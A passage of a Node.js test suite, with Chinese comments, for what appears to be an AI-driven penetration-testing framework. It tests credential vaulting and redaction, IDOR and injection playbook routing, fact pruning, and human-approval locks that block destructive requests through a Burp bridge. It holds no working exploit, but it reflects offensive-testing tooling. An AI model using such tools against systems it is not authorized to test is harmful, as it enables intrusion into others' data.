    const list = await h.run("src_list_capabilities", {}, parent);
    assert.equal(list.items.find((i) => i.id === "localcap").status, "installed");
    assert.equal(list.items.find((i) => i.id === "localmcp").kind, "mcp");
  } finally { restore(); await fsPromises.rm(tmp, { recursive: true, force: true }); }
});

/* [local.49] 合成投影事件白名单闸：三层断言——①未登记名单的直写必须 throw；
   ②lib 源码里所有 appendSessionToolEvent 字面量调用点 ⊆ 名单；③名单 ⊆ applySrcEvent fold case 集合。
   防「新合成事件忘加 fold / 忘登记名单」两类漂移在运行时才炸（local.26/local.46 教训）。 */
test("合成投影事件白名单闸 [local.49]", async () => {
	/* ① 直写未登记名 throw（parent 传 undefined——白名单校验先于 no-op 早退） */
	assert.throws(() => appendSessionToolEvent(void 0, "src_not_a_real_event", {}),
		/未登记 SYNTHETIC_PROJECTION_EVENTS/);
	/* 白名单内 + parent 无 append → 静默 no-op（校验通过后早退） */
	assert.doesNotThrow(() => appendSessionToolEvent(void 0, "src_checkpoint", {}));
	/* 合成 callId 必须跨 web 重启/并发会话不可碰撞，不能依赖模块级计数器。 */
	const emitted = [];
	const parent = { append(_type, data) { emitted.push(data); } };
	appendSessionToolEvent(parent, "src_checkpoint", {});
	appendSessionToolEvent(parent, "src_checkpoint", {});
	assert.equal(emitted.length, 2);
	assert.match(emitted[0].callId, /^src-submit-[0-9a-f-]{36}$/);
	assert.notEqual(emitted[0].callId, emitted[1].callId, "连续合成事件 callId 不得重复");
	/* ② 源码扫描：所有字面量调用点 ⊆ 名单 */
	const toolSources = await Promise.all([
		fsPromises.readFile(new URL("../lib/src.js", import.meta.url), "utf8"),
		fsPromises.readFile(new URL("../lib/src/tools/index.js", import.meta.url), "utf8")
	]);
	const libSource = toolSources.join("\n");
	const callSites = [...libSource.matchAll(/appendSessionToolEvent\([^,]+,\s*"([a-z_0-9]+)"/g)].map((m) => m[1]);
	assert.ok(callSites.length >= 10, `应扫到 ≥10 个字面量调用点，实际 ${callSites.length}`);
	for (const name of callSites) {
		assert.ok(SYNTHETIC_PROJECTION_EVENTS.has(name), `调用点 "${name}" 未登记 SYNTHETIC_PROJECTION_EVENTS`);
	}
	/* ③ 名单 ⊆ applySrcEvent fold case 集合（无 fold 的合成事件会让投影与 store 永久漂移） */
	const foldCases = new Set([...libSource.matchAll(/case "(src_[a-z_0-9]+)"/g)].map((m) => m[1]));
	for (const name of SYNTHETIC_PROJECTION_EVENTS) {
		assert.ok(foldCases.has(name), `白名单事件 "${name}" 在 applySrcEvent 无 fold case`);
	}
	/* applySrcEvent 烟测：白名单事件经 fold 不炸（拿 src_auth_budget 空投影试） */
	const state = structuredClone(srcInitialState);
	assert.doesNotThrow(() => applySrcEvent(state, { type: "tool/call", data: { name: "src_auth_budget", arguments: JSON.stringify({ used: 1, limit: 30 }) } }));
});

test("子代理状态观察：运行时目录优先、checkpoint 兼容回退", async () => {
  const h = harness();
  const parent = h.exec("delegation-state-parent");
  const child = h.exec("delegation-state-child", "delegation-state-parent");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "delegation state", authorization: "ticket-delegation" }, parent);
  const intent = await h.run("src_add_intent", { title: "被动侦察", detail: "验证子代理状态", goalId: goal.id }, parent);
  await h.run("src_update_intent", { intentId: intent.id, status: "running" }, parent);
  h.ctx.subagents.listChildren = async () => [{ kind: "child", id: "delegation-state-child", mode: "continuable", activity: "running", label: "recon" }];
  let state = await h.run("src_state", {}, parent);
  assert.equal(state.delegationState.find((row) => row.intentId === intent.id).status, "not-started");
  assert.deepEqual(state.unassignedRuntimeChildren, ["delegation-state-child"]);
  assert.equal(state.delegationState.find((row) => row.intentId === intent.id).runtimeObserved, true);
  await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "首个进度检查点", facts: [{ kind: "info", target: "example.test", detail: "仅测试状态观察", confidence: 1 }] }, child);
  h.ctx.subagents.listChildren = async () => [{ kind: "child", id: "delegation-state-child", mode: "continuable", activity: "inactive", label: "recon" }];
  state = await h.run("src_state", {}, parent);
  assert.equal(state.delegationState.find((row) => row.intentId === intent.id).status, "progress-unfinished");
  assert.deepEqual(state.delegationState.find((row) => row.intentId === intent.id).childSessionIds, ["delegation-state-child"]);

  const fallback = harness();
  const fallbackParent = fallback.exec("delegation-fallback-parent");
  const fallbackGoal = await fallback.run("src_add_goal", { target: "https://example.test", objective: "fallback", authorization: "ticket-fallback" }, fallbackParent);
  const fallbackIntent = await fallback.run("src_add_intent", { title: "侦察", detail: "没有宿主目录接口", goalId: fallbackGoal.id }, fallbackParent);
  await fallback.run("src_update_intent", { intentId: fallbackIntent.id, status: "running" }, fallbackParent);
  const fallbackState = await fallback.run("src_state", {}, fallbackParent);
  assert.equal(fallbackState.delegationState.find((row) => row.intentId === fallbackIntent.id).status, "not-started");
  assert.deepEqual(fallbackState.runtimeChildren, []);
});

test("clown-src 专题自动路由：intent/store/projection/state 四处一致", async () => {
  const h = harness();
  const parent = h.exec("playbook-parent");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "playbook routing", authorization: "ticket-playbook" }, parent);
  const intent = await h.run("src_add_intent", { title: "越权与注入验证", detail: "检查租户对象换 id、搜索筛选参数和跨主体差分", goalId: goal.id }, parent);
  assert.deepEqual(intent.playbook.keys, ["authorization", "injection"]);
  assert.ok(intent.playbook.docs.includes("skills/skill/知识库/idor-test.md"));
  assert.ok(intent.playbook.docs.includes("skills/skill/知识库/injection-test.md"));
  assert.ok(intent.playbook.checks.some((check) => check.includes("基线")));
  assert.deepEqual(routePlaybook("越权与注入验证", "检查租户对象换 id、搜索筛选参数和跨主体差分"), intent.playbook);
  const storedView = await h.run("src_state", {}, parent);
  assert.deepEqual(storedView.intents.find((row) => row.id === intent.id).playbook, intent.playbook);
  let folded = applySrcEvent(srcInitialState, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "https://example.test", objective: "playbook routing", authorization: "ticket-playbook" }) } });
  folded = applySrcEvent(folded, { type: "tool/call", data: { name: "src_add_intent", arguments: JSON.stringify({ title: "越权与注入验证", detail: "检查租户对象换 id、搜索筛选参数和跨主体差分", goalId: "goal-1" }) } });
  assert.deepEqual(folded.nodes.find((node) => node.id === intent.id).playbook, intent.playbook);
  const state = await h.run("src_state", {}, parent);
  assert.match(state.intents.find((row) => row.id === intent.id).playbook.docs.join(" "), /idor-test\.md/);
  assert.match(h.tools.get("src_state").output.render("", state)[0].text, /专题=authorization\+injection/);
  assert.deepEqual(PLAYBOOK_ROUTE_KEYS.includes("authorization"), true);
});

/* [local.50b] 单一 mutation API 三账本闸：一次调用必须同时完成 durable write、合成事件和 projection fold。 */
test("单一 mutation API 保持 store/event/projection 三账本一致 [local.50b]", async () => {
	let durable = "old";
	const emitted = [];
	const parent = { append(type, data) { emitted.push({ type, data }); } };
	const value = await commitSyntheticMutation(parent, async () => {
		durable = "13800138000";
		return { value: durable, events: [syntheticEvent("src_set_infra", { key: "testPhone", value: durable })] };
	}, appendSessionToolEvent);
	assert.equal(value, durable, "mutation 返回 durable write 结果");
	assert.equal(emitted.length, 1, "同一 mutation 只发声明的一条合成事件");
	let projection = structuredClone(srcInitialState);
	projection = applySrcEvent(projection, emitted[0]);
	assert.equal(projection.infra.testPhone, durable, "projection fold 与 durable write 一致");
	await assert.rejects(
		commitSyntheticMutation(parent, async () => ({ value: null, events: [{ args: {} }] }), appendSessionToolEvent),
		/synthetic mutation events require/,
		"无 name 的事件必须在 mutation 边界失败"
	);
});

/* [local.54] 凭证库基础行为：写入/读回/校验/脱敏/头解析（独立临时 DSH_HOME，不碰真实 ~/.dsh）。 */
test("[local.54] credentials 模块：指纹写入/读回校验/脱敏/头解析", async () => {
	const { writeCredential, readCredential, redactCredential, redactText, credentialHeaders, stripCredentialHeaders, credentialVaultDir } = await import("../lib/src/credentials.js");
	const tmp = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "creds54-"));
	try {
		const written = await writeCredential({ dshHome: tmp, sessionId: "sess54", label: "用户A", credential: "Cookie: sid=abc; role=user" });
		assert.match(written.ref, /^credential:\/\/[a-f0-9]{64}$/);
		/* 同凭据重复写 = 同一指纹文件（内容寻址幂等）。 */
		const again = await writeCredential({ dshHome: tmp, sessionId: "sess54b", label: "用户A2", credential: "Cookie: sid=abc; role=user" });
		assert.equal(again.ref, written.ref);
		/* 读回 + 篡改检测。 */
		assert.equal(await readCredential({ dshHome: tmp, ref: written.ref }), "Cookie: sid=abc; role=user");
		await assert.rejects(() => readCredential({ dshHome: tmp, ref: "credential://" + "0".repeat(64) }), /凭证文件|校验失败|ENOENT/);
		await assert.rejects(() => readCredential({ dshHome: tmp, ref: "not-a-ref" }), /格式非法/);
		/* 脱敏：认证头整行替换，非认证头保留，Bearer token 掩码。 */
		assert.equal(redactCredential("Cookie: sid=secret"), "Cookie: <stored>");
		assert.equal(redactCredential("X-Custom: visible"), "X-Custom: visible");
		assert.equal(redactCredential("Authorization: Bearer abc.def"), "Authorization: <stored>");
		assert.equal(redactText("https://x.test/a?token=rawsecret&b=2"), "https://x.test/a?token=<stored>&b=2");
		/* 头解析：多行凭据 → 认证头映射；非凭据文本报错。 */
		assert.deepEqual(credentialHeaders("Cookie: sid=1\r\nAuthorization: Bearer t"), { Cookie: "sid=1", Authorization: "Bearer t" });
		assert.deepEqual(credentialHeaders("Bearer rawjwt"), { Authorization: "Bearer rawjwt" });
		/* [local.54] user:pass 对照账号 → Basic；纯用户名无法注入。 */
		assert.deepEqual(credentialHeaders("alice:hunter-secret-pass"), { Authorization: `Basic ${Buffer.from("alice:hunter-secret-pass").toString("base64")}` });
		assert.throws(() => credentialHeaders("alice"), /无法解析为认证头/);
		assert.throws(() => credentialHeaders("User-Agent: x"), /无法解析为认证头/);
		/* strip：只剥认证头。 */
		assert.deepEqual(stripCredentialHeaders({ Cookie: "a", Authorization: "b", "X-User-Id": "7" }), { "X-User-Id": "7" });
		/* 目录权限 0700 + 文件 0600（非 Windows）。 */
		const { statSync, readdirSync } = await import("node:fs");
		if (process.platform !== "win32") {
			assert.equal(statSync(credentialVaultDir(tmp)).mode & 0o777, 0o700);
			const f = readdirSync(credentialVaultDir(tmp)).find((x) => x.endsWith(".json"));
			assert.equal(statSync(nodePath.join(credentialVaultDir(tmp), f)).mode & 0o777, 0o600);
		}
	} finally { await fsPromises.rm(tmp, { recursive: true, force: true }); }
});

/* [local.54] 深层 undefined 剥离：嵌套对象/数组里的显式 undefined 不再污染 lossless 输出。 */
test("[local.54] snapshot 深层 undefined 剥离 + 域笔记渲染不出现 undefined", async () => {
	const h = harness();
	const parent = h.exec("g54deep");
	await h.run("src_add_goal", { target: "https://example.test", objective: "深 undefined", authorization: "t" }, parent);
	/* 域笔记 render：title 必须出现在输出（旧 bug：schema 漏声明导致渲染「undefined」）。 */
	const note = await h.run("src_record_domain_note", { category: "pitfall", title: "某接口限流 5rps", content: "现象：…" }, parent);
	const tool = h.tools.get("src_record_domain_note");
	const rendered = tool.output.render({}, note).map((r) => r.text).join("");
	assert.match(rendered, /某接口限流 5rps/);
	assert.doesNotMatch(rendered, /undefined/);
	/* finding 携带嵌套 affectedAssetId: undefined 时 state 输出仍 lossless。 */
	await h.run("src_add_intent", { title: "i", goalId: "goal-1" }, parent);
	const factEvidence = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET /x -> 200 他人手机号", confidence: 0.9 }, parent)).id;
	await h.run("src_add_finding", { intentId: "intent-1", title: "f", severity: "low", impact: "x", victimImpact: "受害者视角：普通用户资料被读取且无从察觉", attackPrerequisites: "利用前提：仅需注册普通账号即可遍历", affectedScope: "s", remediation: "r", pocEvidence: ["p"], reproducibleSteps: ["s"], concreteLossEvidence: [factEvidence] }, parent);
	const state = await h.run("src_state", {}, parent);
	assert.equal(isJsonValue(state), true, "state 输出必须 lossless（嵌套 undefined 已剥离）");
});

/* [local.54] 面板/工具通道的 testAccount 凭据自动入凭证库：infra 表与返回值只存引用。 */
test("[local.54] src_set_infra testAccount 明文自动入凭证库（infra 只存 credentialRef）", async () => {
	const h = harness();
	const parent = h.exec("g54infra");
	await h.run("src_add_goal", { target: "https://example.test", objective: "infra 凭据入库存", authorization: "t" }, parent);
	const saved = await h.run("src_set_infra", { key: "testAccount", value: "alice:hunter-secret-pass" }, parent);
	assert.match(saved.value, /^credential:\/\/[a-f0-9]{64}$/, "infra 值变成 credentialRef");
	/* 旧版兼容：view 仍列出 legacy-infra 行。 */
	const state = await h.run("src_state", {}, parent);
	assert.equal(state.testAccounts.some((r) => r.label === "legacy-infra"), true);
	assert.equal(state.testAccounts.every((r) => !("credential" in r)), true);
	/* get_infra 读到的也是引用（agent 拿引用去 src_http，不再见明文）。 */
	const got = await h.run("src_get_infra", { key: "testAccount" }, parent);
	assert.match(JSON.stringify(got), /credential:\/\//);
	assert.doesNotMatch(JSON.stringify(got), /hunter-secret-pass/, "get_infra 不再返回明文凭据");
	/* 引用可直接用在 src_http（vault 能读回）。 */
	const vault = await readCredentialForTest(saved.value);
	assert.equal(vault, "alice:hunter-secret-pass");
	/* user:pass 经 credentialHeaders 还原成 Basic 认证头（面板文档格式闭环）。 */
	const { credentialHeaders } = await import("../lib/src/credentials.js");
	assert.match(credentialHeaders(vault).Authorization ?? "", /^Basic /);
});

/* [local.50a] 工具清单冻结闸：拆包前锁定名称与注册顺序；preset toolFilter 依赖顺序，漏迁/重排必须立即失败。 */
test("工具清单与注册顺序冻结 [local.50a 前置闸]", () => {
	const h = harness();
	assert.deepEqual([...h.tools.keys()], [
		"src_scan_surface", "src_test_bypass", "src_test_credential", "src_record_observation",
		"src_user_todo", "src_import_traffic", "src_collect_dorks", "src_collect_passive", "src_submit",
		"src_recover_child", "src_record_research", "src_get_infra", "src_list_capabilities", "src_add_capability",
		"src_test_capability", "src_read_capability", "src_run_capability", "src_fetch_policy", "src_set_infra",
		"src_add_test_account", "src_record_domain_note", "src_list_domain_notes", "src_set_goal_target",
		"src_record_coverage", "src_http", "src_add_goal", "src_add_intent", "src_update_intent", "src_add_fact",
		"src_add_finding", "src_add_asset", "src_state", "src_graph", "src_finalize_engagement", "src_report",
		"src_update_finding", "src_reject_finding", "src_resolve_approval", "src_request_asset_confirm",
		"src_record_lesson", "src_read_lesson", "src_search_lessons", "src_serve_proof", "src_stop_serve"
	], "拆包前必须冻结当前工具名称和注册顺序");
});

/* [local.49] 元测试闸：新增 sessions.set 一律描述性 id（≥3 字符），历史 "p"/"parent" 豁免。 */
test("测试会话 id 规范 [local.49]", async () => {
	const source = await fsPromises.readFile(new URL("./src.integration.test.mjs", import.meta.url), "utf8");
	const ids = [...source.matchAll(/sessions\.set\("([^"]+)"/g)].map((m) => m[1]);
	const legacy = new Set(["p", "parent"]);
	for (const id of ids) {
		if (legacy.has(id)) continue;
		assert.ok(id.length >= 3, `sessions.set("${id}") id 过短——新增会话 id 必须描述性命名（≥3 字符），见文件顶部规范注释`);
	}
	assert.ok(ids.length >= 4, `应扫到 ≥4 个 sessions.set 调用点，实际 ${ids.length}`);
});

/* [local.60] 投影分级裁剪：此前 withNode/withAsset 对 nodes/edges/assets 一律 slice(-200)，
   9864adca 会话实测 177 个节点被静默裁掉（intent-1..10 全灭、finding-1/2 被 add_fact 挤出）。
   新语义：finding/intent 永不裁；fact 超 500 裁最老并同步清理关联边；assets 同理（root-domain 豁免）。 */
test("[local.60] 投影分级裁剪：finding/intent 不裁、fact 超 500 裁最老、edges 同步清理", () => {
  const tc = (name, args) => ({ type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  let st = srcInitialState;
  st = applySrcEvent(st, tc("src_add_goal", { target: "zto.test", objective: "cap" }));
  st = applySrcEvent(st, tc("src_add_intent", { title: "cap-intent", goalId: "goal-1" }));
  for (let i = 1; i <= 520; i++) st = applySrcEvent(st, tc("src_add_fact", { intentId: "intent-1", kind: "http", detail: `fact-${i}` }));
  st = applySrcEvent(st, tc("src_add_intent", { title: "late-intent", goalId: "goal-1" }));
  for (let f = 1; f <= 3; f++) {
    st = applySrcEvent(st, tc("src_add_finding", { intentId: "intent-1", title: `finding-cap-${f}`, severity: "low", impact: "影响说明", affectedScope: "范围", remediation: "修复建议", pocEvidence: ["GET / => x"], reproducibleSteps: ["GET /"], victimImpact: "受害者影响说明", concreteLossEvidence: ["fact-500"] }));
  }
  const kinds = { intent: 0, fact: 0, finding: 0 };
  for (const node of st.nodes) kinds[node.kind] += 1;
  assert.equal(kinds.intent, 2, "intent 永不裁剪（9864adca 曾全灭）");
  assert.equal(kinds.finding, 3, "finding 永不裁剪（曾被 add_fact 挤出）");
  assert.equal(kinds.fact, 500, "fact 超 500 裁最老");
  assert.equal(st.nodes.some((n) => n.kind === "fact" && n.detail === "fact-1"), false, "最老 fact 被裁");
  assert.equal(st.nodes.some((n) => n.kind === "fact" && n.detail === "fact-520"), true, "最新 fact 保留");
  assert.equal(st.edges.some((e) => e.targetId === "fact-1"), false, "被裁 fact 的关联边同步清理");
  assert.equal(st.edges.some((e) => e.targetId === "fact-520"), true, "保留 fact 的边完好");
  /* assets 分级：root-domain 豁免，其他超 500 裁最老 */
  st = applySrcEvent(st, tc("src_add_asset", { type: "root-domain", value: "zto.test", source: "goal" }));
  for (let i = 1; i <= 505; i++) st = applySrcEvent(st, tc("src_add_asset", { type: "subdomain", value: `s${i}.zto.test`, source: "scan" }));
  const rootDomains = st.assets.filter((a) => a.type === "root-domain");
  assert.equal(rootDomains.length, 1, "root-domain 资产永不裁剪（UI 分组依赖）");
  assert.equal(st.assets.length, 501, "assets 超 500 裁最老（root-domain 除外）");
  assert.equal(st.assets.some((a) => a.value === "s1.zto.test"), false, "最老 subdomain 被裁");
  assert.equal(st.assets.some((a) => a.value === "s505.zto.test"), true, "最新 subdomain 保留");
});

/* [local.60] src_user_todo 更新模式不再强制 title：9864adca 14:00 更新 todo-1 状态被 schema 拒
   （update 带 userTodoId 时 title 仍 required）。三层修复：schema 可选 + execute 新建缺 title 给
   指导性报错 + fold 更新分支不再被 title==="" 短路（旧 bug 整个更新含 status 全丢投影）。 */
test("[local.60] src_user_todo 更新模式不再强制 title（schema+execute+fold 三层）", async () => {
  const h = harness();
  assert.equal(h.tools.get("src_user_todo").parameters.properties.title.required, void 0, "schema title 必须 optional");
  const parent = h.exec("l60todo");
  await h.run("src_add_goal", { target: "todo.test", objective: "todo 验证" }, parent);
  const created = await h.run("src_user_todo", { title: "下载小程序确认真实运单号", detail: "用户协同项" }, parent);
  assert.match(created.id, /^userTodo-\d+$/);
  const updated = await h.run("src_user_todo", { userTodoId: created.id, status: "done" }, parent);
  assert.equal(updated.status, "done");
  assert.equal(updated.title, "下载小程序确认真实运单号", "更新模式保留原标题");
  await assert.rejects(() => h.run("src_user_todo", { detail: "缺 title" }, parent), /必须给 title/, "新建缺 title 给指导性报错");
  const tc = (name, args) => ({ type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  let st = srcInitialState;
  st = applySrcEvent(st, tc("src_user_todo", { title: "T1" }));
  const createdId = st.userTodos[0].id; /* [local.64] fold 新建 id 与 store 同源（userTodo- 前缀），不再自造 todo- */
  assert.match(createdId, /^userTodo-\d+$/);
  st = applySrcEvent(st, tc("src_user_todo", { userTodoId: createdId, status: "abandoned" }));
  const row = st.userTodos.find((r) => r.id === createdId);
  assert.equal(row.status, "abandoned", "fold 更新分支生效（旧 bug title===\"\" 短路全丢）");
  assert.equal(row.title, "T1", "fold 更新保留原标题");
  st = applySrcEvent(st, tc("src_user_todo", { title: "T2" }));
  st = applySrcEvent(st, tc("src_user_todo", { detail: "无 id 无 title" }));
  assert.equal(st.userTodos.length, 2, "fold 新建缺 title 仍忽略");
});

/* [local.60] 审批锁：src_http 挂起时把 {id,host,path} 写入 ~/.dsh/storages/src-approval-locks.json
   （burp-mcp-bridge 每次发送前比对，命中拒绝转发）；src_resolve_approval 解决（allow/reject 均算）后清锁。 */
test("[local.60] src_http 挂起写审批锁，resolve 清锁", async () => {
  const h = harness();
  const parent = h.exec("l60lock");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "审批锁验证" }, parent);
  let hitCount = 0;
  const server = http.createServer((_req, res) => { hitCount++; res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const locksFile = nodePath.join(process.env.DSH_HOME, "storages", "src-approval-locks.json");
  try {
    await fsPromises.rm(locksFile, { force: true });
    const pending = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { userId: "15", authorization: "Bearer t" }, justification: "删除 userId=15" }, parent);
    assert.equal(pending.approval, "pending");
    const locks = JSON.parse(await fsPromises.readFile(locksFile, "utf8"));
    assert.equal(locks.length, 1);
    assert.equal(locks[0].id, pending.pendingApprovalId);
    assert.equal(locks[0].host, "127.0.0.1");
    assert.equal(locks[0].path, "/api-c/user/v1/closeAccount");
    assert.ok(locks[0].category.length > 0, "锁带分类便于桥提示");
    const approved = await h.run("src_resolve_approval", { id: pending.pendingApprovalId, action: "allow" }, parent);
    assert.equal(approved.status, "approved");
    assert.equal(hitCount, 1, "批准后原请求照常发出");
    const after = JSON.parse(await fsPromises.readFile(locksFile, "utf8"));
    assert.equal(after.length, 0, "解决后锁清除");
  } finally { server.close(); }
});

/* [local.60] 桥端到端：spawn 真桥进程 + 死上游 + 锁文件，命中锁的请求必须立即被拒（不碰上游），
   未命中的请求放行到上游（连不上报上游错误，且无 ⛔ 标记）。 */
test("[local.60] burp 桥审批绕行硬闸：命中锁拒绝转发，未命中放行", async () => {
  const home = nodePath.join(nodeOs.tmpdir(), `dsh-bridge-lock-${process.pid}-${Date.now()}`);
  await fsPromises.mkdir(nodePath.join(home, "storages"), { recursive: true });
  await fsPromises.writeFile(nodePath.join(home, "storages", "src-approval-locks.json"), JSON.stringify([
    { id: "approval-6", method: "POST", url: "https://gw.test/findUserCertRealName", host: "gw.test", path: "/findUserCertRealName", category: "destructive-write", createdAt: 1 },
  ]));
  const bridgePath = nodePath.resolve(process.cwd(), "tools/burp-mcp-bridge.mjs");
  const { spawn } = await import("node:child_process");
  const child = spawn(process.execPath, [bridgePath], { env: { ...process.env, DSH_HOME: home, BURP_SSE_URL: "http://127.0.0.1:1/", BURP_BRIDGE_LOG: "error" }, stdio: ["pipe", "pipe", "ignore"] });
  const pendingLines = [];
  let buf = "";
  let wake = null;
  child.stdout.setEncoding("utf8");
  child.stdout.on("data", (chunk) => {
    buf += chunk;
    let idx;
    while ((idx = buf.indexOf("\n")) >= 0) {
      const line = buf.slice(0, idx).trim();
      buf = buf.slice(idx + 1);
      if (line === "") continue;
      if (wake) { const w = wake; wake = null; w(line); } else pendingLines.push(line);
    }
  });
  const readLine = (ms) => new Promise((resolve, reject) => {
    if (pendingLines.length > 0) return resolve(pendingLines.shift());
    const timer = setTimeout(() => { wake = null; reject(new Error("桥响应超时")); }, ms);
    wake = (line) => { clearTimeout(timer); resolve(line); };
  });
  const send = (obj) => new Promise((resolve, reject) => { child.stdin.write(`${JSON.stringify(obj)}\n`, (err) => (err ? reject(err) : resolve())); });
  try {
    await send({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "send_http1_request", arguments: { content: "POST /findUserCertRealName HTTP/1.1\r\nHost: gw.test\r\nContent-Length: 0\r\n\r\n", targetHostname: "gw.test", targetPort: 443, usesHttps: true } } });
    const blocked = JSON.parse(await readLine(5000));
    assert.equal(blocked.id, 1);
    assert.equal(blocked.result.isError, true, "命中锁必须 isError");
    assert.match(blocked.result.content[0].text, /⛔.*approval-6/, "拦截文案带审批 id");
    await send({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "send_http1_request", arguments: { content: "GET /other/path HTTP/1.1\r\nHost: gw.test\r\n\r\n", targetHostname: "gw.test", targetPort: 443, usesHttps: true } } });
    const passed = JSON.parse(await readLine(10000));
    assert.equal(passed.id, 2);
    const text = passed.error !== void 0 ? JSON.stringify(passed.error) : (passed.result?.content?.[0]?.text ?? "");
    assert.doesNotMatch(text, /⛔/, "未命中不得被守卫拦截（连不上是上游错误）");
  } finally {
    child.kill("SIGKILL");
    await fsPromises.rm(home, { recursive: true, force: true }).catch(() => {});
  }
});

/* [local.61/62] 数据编排引擎：mini-program 资产 → 系统自动挂「请在微信打开目标小程序」待办
 * （不经模型自觉）。断言：投影 fold 有节点、合成事件带 callId、幂等不重复、非小程序不触发、
 * 白名单已登记。[local.62] 起触发逻辑改为读 DSH_HOME/capabilities/index.json 的能力触发器声明，
 * 测试先在隔离 DSH_HOME 种子 index.json（顺带验证引擎读真实索引契约）。 */
test("[local.61/62] mini-program 资产自动挂用户待办（store+投影双写、幂等、非 minapp 不触发）", async () => {
  assert.equal(SYNTHETIC_PROJECTION_EVENTS.has("src_user_todo"), true, "白名单必须登记 src_user_todo");
  const capsDir = nodePath.join(process.env.DSH_HOME, "capabilities");
  await fsPromises.mkdir(capsDir, { recursive: true });
  const capItem = { id: "wx-minapp-recon", kind: "skill", from: "path:/tmp/skill", enabled: true, when: "小程序逆向", status: "installed", dir: "/tmp/skill", scripts: [], triggerAssetTypes: ["mini-program"], triggerKeywords: ["小程序", "wxapkg"], todoTitle: "请在微信打开目标小程序并确认登录", todoKind: "manual-test", todoDetail: "目标包含小程序资产。请在微信中打开该目标小程序并完成登录（若已打开过，直接勾选完成本待办）。完成后 agent 将扫描本机 wxapkg 缓存，用已装能力 wx-minapp-recon 执行 反编译→端点/密钥提取→src_http 测试（走审批闸）。" };
  await fsPromises.writeFile(nodePath.join(capsDir, "index.json"), JSON.stringify({ generatedAt: new Date().toISOString(), capabilities: [capItem] }));
  const h = harness();
  const parentEvents = [];
  h.sessions.set("l61parent", { append(type, data) { parentEvents.push({ type, data }); } });
  const parent = h.exec("l61parent");
  await h.run("src_add_goal", { target: "https://minapp.test", objective: "小程序线验证", authorization: "ticket-61" }, parent);

  // 非小程序资产：不触发
  const plain = await h.run("src_add_asset", { type: "subdomain", value: "api.minapp.test", source: "CT 日志" }, parent);
  assert.equal(plain.orchestration, void 0, "非 mini-program 且不命中关键词不触发");

  // 小程序资产：自动挂待办
  const mp = await h.run("src_add_asset", { type: "mini-program", value: "wx1234567890abcdef", source: "目标情报" }, parent);
  assert.match((mp.orchestration ?? []).join("\n"), /已自动挂起用户待办/, "触发提示进工具返回");
  const todoEvents = parentEvents.filter((e) => e.type === "tool/call" && e.data.name === "src_user_todo" && JSON.parse(e.data.arguments).title.startsWith("请在微信打开目标小程序"));
  assert.equal(todoEvents.length, 1, "父日志恰好一条合成 src_user_todo 事件");
  const todoArgs = JSON.parse(todoEvents[0].data.arguments);
  assert.equal(todoArgs.kind, "manual-test");
  assert.match(todoArgs.title, /^请在微信打开目标小程序并确认登录$/);
  assert.match(todoEvents[0].data.callId, /^src-submit-/, "合成事件必须带 callId（local.26 闸门）");
  let st = srcInitialState;
  for (const e of parentEvents.filter((e) => e.type === "tool/call")) st = applySrcEvent(st, e);
  const folded = st.userTodos.find((r) => r.title.startsWith("请在微信打开目标小程序"));
  assert.ok(folded, "fold 投影有待办节点");
  assert.equal(folded.status, "pending");
  assert.equal(folded.detail.includes("wx-minapp-recon"), true, "detail 引导到已装能力");

  // 幂等：再登记一个小程序资产，不重复挂（「已存在」提示本身证明 store 行可查到）
  const mp2 = await h.run("src_add_asset", { type: "mini-program", value: "wxfedcba0987654321", source: "第二条" }, parent);
  assert.match((mp2.orchestration ?? []).join("\n"), /已存在/, "第二次提示已存在（store 幂等依据生效）");
  assert.equal(parentEvents.filter((e) => e.type === "tool/call" && e.data.name === "src_user_todo" && JSON.parse(e.data.arguments).title.startsWith("请在微信打开目标小程序")).length, 1, "不重复发合成事件");
  st = srcInitialState;
  for (const e of parentEvents.filter((e) => e.type === "tool/call")) st = applySrcEvent(st, e);
  assert.equal(st.userTodos.filter((r) => r.title.startsWith("请在微信打开目标小程序")).length, 1, "投影不重复");
});

/* [local.62] 数据编排推广：①能力触发器关键词命中只出提示（不挂待办）②决策点经验注入
 * （lesson-meta.triggers → lessonsForContext → src_add_intent/src_finalize 返回带 lessonHints）
 * ③src_record_lesson 声明触发器后可被后续决策点命中。 */
test("[local.62] 能力触发器关键词命中出提示（无待办）", async () => {
  const capsDir = nodePath.join(process.env.DSH_HOME, "capabilities");
  await fsPromises.mkdir(capsDir, { recursive: true });
  const capItem = { id: "fofa", kind: "mcp", from: "npm:x", enabled: true, when: "资产测绘", status: "installed", triggerKeywords: ["诈骗", "钓鱼"] };
  await fsPromises.writeFile(nodePath.join(capsDir, "index.json"), JSON.stringify({ generatedAt: new Date().toISOString(), capabilities: [capItem] }));
  const h = harness();
  const parentEvents = [];
  h.sessions.set("l62kw", { append(type, data) { parentEvents.push({ type, data }); } });
  const parent = h.exec("l62kw");
  await h.run("src_add_goal", { target: "https://kw.test", objective: "关键词触发", authorization: "t62" }, parent);
  const kw = await h.run("src_add_asset", { type: "subdomain", value: "phish.kw.test", source: "情报：疑似钓鱼域名" }, parent);
  assert.equal((kw.orchestration ?? []).length, 1, "关键词命中出提示");
  assert.match(kw.orchestration[0], /能力触发器命中 fofa（关键词命中）/, "提示带能力 id 与命中方式");
  assert.equal(parentEvents.filter((e) => e.type === "tool/call" && e.data.name === "src_user_todo" && String(JSON.parse(e.data.arguments).title).includes("目标小程序")).length, 0, "关键词命中不挂待办（goal 自身的覆盖待办不计）");
  const no = await h.run("src_add_asset", { type: "subdomain", value: "plain.kw.test", source: "CT 日志" }, parent);
  assert.equal(no.orchestration, void 0, "未命中无提示");
});

test("[local.62] 决策点经验注入：lesson triggers → src_add_intent/finalize 返回带 lessonHints", async () => {
